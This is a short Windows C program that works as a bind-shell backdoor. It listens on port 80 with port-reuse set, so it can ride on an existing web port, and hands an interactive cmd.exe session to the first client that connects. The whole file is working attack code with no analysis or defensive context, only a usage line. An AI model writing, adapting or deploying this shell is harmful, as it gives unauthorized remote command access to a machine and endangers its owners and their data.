#pragma comment(lib, "ws2_32");
#pragma comment(lib, "advapi32");
#pragma comment(lib, "user32");
#include <stdio.h>
#include <winsock2.h>

int main(int argc, char *argv[]){
    int ret, sinSize;
    WSADATA wsa;
    SOCKET ssock, csock;
    BOOL val = TRUE;
    struct sockaddr_in sin;
    STARTUPINFO si;

    if(argc < 2){
        printf("usage: this.exe 192.168.12.123\n");
        return 0;
    }

    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsa);
    ssock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    setsockopt(ssock, SOL_SOCKET, SO_REUSEADDR, (char*)&val, sizeof(val));  //reuse port

    sin.sin_family  = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr(argv[1]);                               //listen addr
    sinSize = sizeof(sin);
    bind(ssock, (sockaddr*)&sin, sinSize);
    listen(ssock, 2);
    csock = accept(ssock, (sockaddr*)&sin, &sinSize);

    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (void*)csock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
    return 0;

}

